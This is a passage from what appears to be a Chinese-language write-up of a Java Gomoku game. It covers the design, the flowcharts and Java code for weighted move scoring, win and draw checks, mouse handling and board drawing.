id="2-开发语言与工具介绍">2 开发语言与工具介绍</h3><h4 id="2-1-java语言">2.1 JAVA语言</h4><p>Java是一种完全的面向对象语言，所有的操作都是通过对象来完成的。Java中一切皆为对象，包括基本数据类型，如整型、字符型等^[5]^。Java的创造者是由Sun Microsystems公司里的James Gosling与他背后的团队于1995年，秉持着“一次编写，处处运行”（Write Once, Run Anywhere, 简称WORA）的设计理念开发出来的，意在编写出来的Java代码可以在任何支持Java平台上正常运行，并且无需进行额外的修改。</p><p>选择Java语言编译五子棋游戏是因为该语言具有多种优点。例如Java语言的平台无关性，Java程序可以跨不同的诸如Windows、Linux和Mac OS平台系统移植，这得益于Java程序的编写流程，其首先编译成与操作平台没有关系的字节码，然后只要任何一台设备安装了Java虚拟机（JVM），它就可以运行这些字节码。面向对象编程（OOP）是一种软件开发方法，它将程序设计的重点放在对象的创建、操作和互动上^[6]^。这种面向对象的特点，支持封装、继承和多态等面向对象的特性，这种特色有助于构建模块化的程序和复用代码。除此之外Java还可以自动管理内存，减少内存泄漏，具有一系列运行时对环境的一系列检查等多种优点。</p><p>综上所述，Java语言具有跨平台性、健壮性、安全性等特点的优秀编程语言</p><h4 id="2-2-intellij-idea-community-edition工具">2.2 IntelliJ IDEA Community Edition工具</h4><p>IntelliJ IDEA Community Edition是由JetBrains 公司制作的集成开发环境 (IDE)，专门用来开发Java，里面丰富的工具与功能，能很大地提高开发者的生产效率和生产质量，作为免费的开源开发工具，能够胜任大多数基本的Java开发任务。</p><p>IntelliJ IDEA具有智能的代码完成与导航功能，能够根据代码的上下文甚至代码风格提供建议，而高效的导航功能能帮助开发者快速定位浏览代码。IntelliJ IDEA中的诸如重命名、提取方法、提取变量等代码重构工具，可以让开发者更轻松的重构优化代码，从而达到提高代码质量与可维护性的效果。IntelliJ IDEA中还有例如Git、Subversion 等的控制系统，可以方便开发人员的团队协作与代码管理。IDE还提供了强大的调试工具，可以进行断点调试、变量查看、表达式评估等，从而提升解决代码中问题的效率。此外IDE同Java一样也具有跨平台性，可以在 Windows、macOS 和 Linux 等主流操作系统上运行。</p><p>综上所述，IntelliJ IDEA Community Edition 是一款功能强大且易于使用的开发工具，它丰富的功能与多样的工具可以极大地提升开发者的工作效率与舒适度。</p><h3 id="3-系统分析">3 系统分析</h3><h4 id="3-1-五子棋游戏规则介绍">3.1 五子棋游戏规则介绍</h4><p>五子棋游戏道具由棋子与棋盘构成，棋子分为两色，一般为一黑一白，一般定黑子113枚，白子112枚，棋盘一般由纵横各15道线条等距离，垂直交叉的平行线构成，这些线条交叉构成了225个交叉点，也就是落子点。玩家在一局游戏内，一方执黑棋，另一方执白旗。</p><p>五子棋游戏规则为：</p><p>（1）玩家在一局游戏内，一方执黑棋，另一方执白旗。</p><p>（2）开局的棋盘为空棋盘。</p><p>（3）由执黑子方先下，随后是白方，以此交替落子，每次都只能下一子。</p><p>（4）棋子只能落在交叉点上，棋子落定后不能在移动或拿走棋子。</p><p>（5）黑棋的第一枚棋子必须落在中心交叉点上。</p><p>（6）一方首先达成五颗连续的本方棋子在一条方向线上，则游戏胜利。</p><h4 id="3-2-五子棋游戏系统分析">3.2 五子棋游戏系统分析</h4><h5 id="3-2-1-需求分析">3.2.1 需求分析</h5><p>作为一款游戏系统，必须拥有最基本的功能，游戏开始、游戏结束，而作为五子棋游戏，还要拥有悔棋功能，而作为一款必须要求两人进行的游戏，可以提供人机模式，实现人机对战，既能降低游戏人数的要求，还可以锻炼玩家的五子棋的游戏技巧能力。最后还可以添加先后手模式，让玩家拥有更多的游戏方式选择。</p><p>五子棋游戏系统需要拥有必要的视图设计[7]，包括开始菜单，棋盘棋子绘制，游戏信息提示。关于游戏规则，系统需要有游戏平局、游戏一方胜利的游戏结束，还有棋子合法落定等功能。</p><p>综上所述，本系统需要拥有游戏开始、游戏结束、悔棋、人人对战模式、人机对战模式、先后手选择以及游戏平局判定、游戏胜利判定和棋子合法落定判定。</p><h5 id="3-2-2-系统设计">3.2.2 系统设计</h5><p>根据五子棋游戏系统的需求分析，可以将五子棋游戏细分为如下的功能模块。</p><p>界面展示模块，该模块主要负责五子棋游戏的界面的展示，包括展示开始界面的背景图，模式功能选择连接，开始游戏、先后手选择、人机或者人人模式、悔棋功能、停止当前游戏（结束游戏）和一些人性化提示，这些基础且必要的功能都要通过界面展示模块展示在屏幕上供玩家使用。</p><p>棋盘绘制模块，脱离了棋具的五子棋游戏系统，需要设计绘制出电子棋盘和棋子，以便玩家能够正常地得到五子棋游戏中的信息反馈。在棋盘绘制时，选择最常规的15道盘，棋子颜色取黑白两色，为了使棋盘更美观，显得不那么单调，还可以为棋盘下设计背景图，特别是柔和的图片，以免玩家过早视觉疲劳。</p><p>胜负判定模块，该模块是整个五子棋能够正常运行的重要模块之一，需要在每一次游戏一方落子后，以该棋子为中心进行横向、纵向和斜方向的扫描，查看是否达成五子连珠的胜利条件，若是则调用结束模块，否则继续游戏。</p><p>悔棋模块，悔棋功能是棋类游戏一般都需要拥有的功能，玩家在已经有成功落子的记录后，通过悔棋来撤销该操作。</p><p>AI下棋模块，该模块主要应用于人机对战模式，在需要电脑落子时，五子棋系统需要根据当前棋局形势查找最有利的落子位置[8]，这包括属于防守的以己方达成五子连珠为目的的最佳落子点，还包括属于进攻的以破坏敌方达成五子连珠为目的的最佳落子点，最后根据哪一思路最优来落子。</p><p>系统提示模块，该模块非五子棋游戏刚需，目的是为了提高玩家的游戏体验。系统提示模块的主要功能为提醒玩家当前需要哪一方进行落子操作，以免混淆落子顺序。</p><p>如图2-1为系统结构图。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Java语言的五子棋游戏\系统结构图.png" style="zoom:60%;" /><center>图2-1 系统结构图</center><h5 id="3-2-3-系统流程">3.2.3 系统流程</h5><p>启动游戏，玩家在开始界面可以选择人机对战和人人对战两种模式，其中在人机对战里，还有先后手模式的选择。</p><p>在人人对战里，默认首先下棋的一方为黑色棋子，玩家落子后，系统就会启动胜负判定模块，查看该落子位置是否存在五子连珠情况，若存在，则该玩家判定为获得胜利，游戏直接结束。若无五子连珠情况，则会进入下一种局势判定，是否平局，其实就是查看棋盘是否已满，若已满，则游戏结束，若没满，则交换到对方落子。另外，非平局结果判定后，还可以选择悔棋，撤回刚刚落下的棋子，选择新的落棋点，这个操作是在交换下棋方之前执行的。</p><p>如下图2-2为选择人人对战的五子棋游戏系统流程图。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Java语言的五子棋游戏\人人模式对战流程图.png" style="zoom:60%;" /><center>图2-2 人人模式对战流程图</center><p>在人机对战里，开始游戏前会有一个先后手模式的选择，不予选择的话，默认玩家为后手。在后手情况下，AI系统会先扫描整个棋盘，并对每个合法落子点进行打分，选择在最高得分落子点落子，然后进入胜利判断，若为玩家先手，则没有AI的计算过程，在玩家落子后直接进入胜利判断——有无五子连珠。若为五子连珠，则判定当前棋手胜利，游戏结束。若无五子连珠，则会进行平局判定，这些与人人对战的判定都是相同的，若不是平局，则交换下棋方。非平局非一方胜利情况下，玩家可以选择悔棋，与人人模式悔棋只撤回最后下的棋子不同的是，人机对战模式不仅会撤回最后的棋子，还会回档到AI最后落子前，即直接回到上一次的玩家回合。</p><p>如图2-3为选择人机对战的五子棋游戏系统流程图。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Java语言的五子棋游戏\人机模式对战流程图.png" alt="img" style="zoom:60%;" /><center>图2-3 人机模式对战流程图</center><h3 id="4-关键功能实现">4 关键功能实现</h3><h4 id="4-1-ai落子算法">4.1 AI落子算法</h4><p>该算法是五子棋游戏系统的核心算法，是围绕五子棋博弈[9]设计出来的。其中包含了落子博弈，落子赋值，极大值搜索算法，最佳位置随机选取等。</p><p>落子赋值，也可称为权值法[10]，其实是对棋盘的每一个可以的落子点进行赋值打分，比较出最高分后，算则在此位置落子。打分的标准是根据棋子位置来定的。例如，给可以达成五子连珠己方棋子的位置打最高分，在这里赋值十万，对于已有三枚连续的己方棋子，可达成四子连珠的情况，在这里赋值五千，还有种种情况进行一一打分。当然，算法的打分还包括为敌方的可落子位置打分，并且因情况而论，打分的依据与己方会有所不同，例如某个落地点可达成敌方的五子连珠，会给予三万的评分。这是仅次于己方五子连珠的第二高评分。</p><p>极大值搜索算法，该算法是在完成落子赋值算法后的，算法的功能是把每个位置的值放进他们对应的二维数组，通过冒泡排序比较出最大值，算出来的最大值将为之后的落子博弈提供数据。</p><p>落子博弈，落子博弈的基础是依赖于落子赋值与极大搜索值的，博弈分为进攻与防守，当所有的合法落子点都赋值以后，算法会进行防守与进攻两种情况的选择，防守的情况是，最高分为趋向于构成己方的五子连珠，也就是说将棋子落在对自己有利的位置。进攻的情况是，最高分为趋向于破坏敌方的五子连珠，也就是说将棋子落在不利于敌方的位置。</p><p>最佳位置随机选取，该算法是在特殊情况下使用的，为的是保证玩家不会因为固定套路取胜。当落子赋值与极大值搜索完成以后，最高的赋值可能不止一个，但由于五子棋游戏规则，每次下棋只能下一枚的缘故，所以要选出唯一的一个最高赋值点，这里采用的是随机生成数，用随机的方法避免被玩家摸索出算法算则最佳落子点的逻辑。</p><p>落子赋值与落子博弈核心代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//左边：黑方Ai的棋子判断      右边：Ai结束后，玩家可能的棋子判断</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"*****"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//连五</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"ooooo"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token number">30000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"-****-"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//活四</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"-oooo-"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"*-***"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token number">700</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//冲四  1</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"o-ooo"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"***-*"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token number">700</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//冲四  1  反向</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"ooo-o"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"-****o"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//冲四  2</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"-oooo*"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"o****-"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//冲四  2  反向</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"*oooo-"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>极大值搜索算法核心代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">long</span> max <span class="token operator">=</span> value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">Position</span> position <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Position</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> row <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> row <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> row<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> col <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> col <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> col<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        f <span class="token punctuation">(</span>value<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token operator">></span>max<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            max<span class="token operator">=</span>value<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">;</span>            position<span class="token punctuation">.</span>x <span class="token operator">=</span>row<span class="token punctuation">;</span>            position<span class="token punctuation">.</span>y <span class="token operator">=</span>col<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最佳位置随机选取核心代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Position</span><span class="token punctuation">></span></span> positions <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>positions<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>position<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> row <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> row <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> row<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> col <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> col <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> col<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>value<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token operator">==</span>value<span class="token punctuation">[</span>position<span class="token punctuation">.</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">.</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            positions<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Position</span><span class="token punctuation">(</span>row<span class="token punctuation">,</span>col<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-2-鼠标事件">4.2 鼠标事件</h4><p>鼠标事件，用来监听棋盘，也就是鼠标监听算法，该算法用来监听用户的点击动作，并进行相应的响应，比如判断鼠标点击的点是不是在范围内，判断玩家点击的范围是否在可落子的范围内，判断该位置之前有没有棋子。如果满足情况，就会在棋盘上显示棋子，并根据当前的系统的流程进度执行相应的操作，比如重绘棋盘，胜负判定，平局判定等。</p><p>鼠标事件核心代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">ChessPanel</span> instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChessPanel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token class-name">ChessPanel</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//为界面添加鼠标监听器</span>    <span class="token comment">//这样就能响应并绘制棋子</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addMouseListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ChessPanelListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">ChessPanel</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> instance<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码实现了一个单实例模式的ChessPanel类，确保了在整个应用程序中只有一个ChessPanel实例，并为这个实例添加了鼠标监听器以处理用户的鼠标事件。实现了具体鼠标实例的创建和引入。</p><p>在具体落子位置判断上也有对应函数如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">mouseReleased</span><span class="token punctuation">(</span><span class="token class-name">MouseEvent</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">ChessPad</span> chessPad <span class="token operator">=</span> <span class="token class-name">ChessPad</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ButtonPanel</span> buttonPanel <span class="token operator">=</span> <span class="token class-name">ButtonPanel</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//获取 绘制的棋盘上 每个交点的坐标 用来判读后面鼠标点击的点是不是在范围内</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Position</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token class-name">ChessPanel</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAllPositions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> x <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getX</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> y <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getY</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> chessBorder <span class="token operator">=</span> <span class="token class-name">ChessPanel</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>chessBorder<span class="token punctuation">;</span>    <span class="token comment">//鼠标位置</span>    <span class="token class-name">Position</span> p <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Position</span> position <span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 这里既要判断玩家点击的范围是否在可落子的范围内</span>        <span class="token comment">// 也要判断该位置之前有没有棋子</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> position<span class="token punctuation">.</span>x <span class="token operator">+</span> chessBorder <span class="token operator">&amp;&amp;</span> x <span class="token operator">>=</span> position<span class="token punctuation">.</span>x <span class="token operator">-</span> chessBorder<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>y <span class="token operator">&lt;=</span> position<span class="token punctuation">.</span>y <span class="token operator">+</span> chessBorder <span class="token operator">&amp;&amp;</span> y <span class="token operator">>=</span> position<span class="token punctuation">.</span>y <span class="token operator">-</span> chessBorder<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span> chessPad<span class="token punctuation">.</span><span class="token function">isEmptyPosition</span><span class="token punctuation">(</span><span class="token class-name">PositionUtil</span><span class="token punctuation">.</span><span class="token function">drawToPad</span><span class="token punctuation">(</span>position<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>             p <span class="token operator">=</span> position<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-3-五子连珠获胜判定以及平局判定算法">4.3 五子连珠获胜判定以及平局判定算法</h4><p>游戏胜利的判定条件为存在相同颜色棋子五颗连续的情况，这会涉及到对整个棋盘满足五颗连续棋子的存储单元进行扫描，每次扫描是与五子连珠进行对比，若完全相同，即可判定游戏胜利。</p><p>胜利判定关键代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">PVPResult</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> allStringList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//这里要将绘图坐标转换为棋盘坐标</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> s <span class="token operator">:</span> allStringList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"*****"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//表示五个黑子连成一串</span>            <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token class-name">MainFrame</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"黑方获胜"</span><span class="token punctuation">,</span><span class="token string">"游戏结束"</span><span class="token punctuation">,</span><span class="token class-name">JOptionPane</span><span class="token punctuation">.</span>INFORMATION_MESSAGE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"ooooo"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 表示五个白子连成一串</span>            <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token class-name">MainFrame</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"白方获胜"</span><span class="token punctuation">,</span><span class="token string">"游戏结束"</span><span class="token punctuation">,</span><span class="token class-name">JOptionPane</span><span class="token punctuation">.</span>INFORMATION_MESSAGE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>平局判定相比较胜利判定会简单很多，就是查看整个棋盘是否已满，由于胜利判定的流程先于平局判定，所以棋满就会平局，反之交换下棋方，继续下棋。</p><p>平局判定核心代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">drawCheckAndShowResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>chessPad<span class="token punctuation">.</span><span class="token function">isFullPad</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token class-name">MainFrame</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"平局"</span><span class="token punctuation">,</span> <span class="token string">"游戏结束"</span><span class="token punctuation">,</span> <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span>INFORMATION_MESSAGE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-4-棋盘绘制">4.4 棋盘绘制</h4><p>棋盘绘制，在预先规定了棋盘行列数和棋盘宽度及任意两条线之间宽度后，就可以进行棋盘绘制，在本程序中是先对天元和占据棋盘的四颗星进行绘制，使其突出显示，再将行线和列线的每一个交点进行绘制，即可落子的点。</p><p>关键代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Position</span><span class="token punctuation">></span></span> <span class="token function">getAllPositions</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//返回绘图板上所有交点的位置</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Position</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Position</span><span class="token punctuation">(</span>gap <span class="token operator">+</span> i <span class="token operator">*</span> size<span class="token punctuation">,</span> gap <span class="token operator">+</span> j <span class="token operator">*</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> list<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-系统测试">5 系统测试</h3><h4 id="5-1-开始界面及棋盘棋子绘制">5.1 开始界面及棋盘棋子绘制</h4><p>五子棋游戏系统的开始界面如图4-1所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Java语言的五子棋游戏\开始界面.jpg" 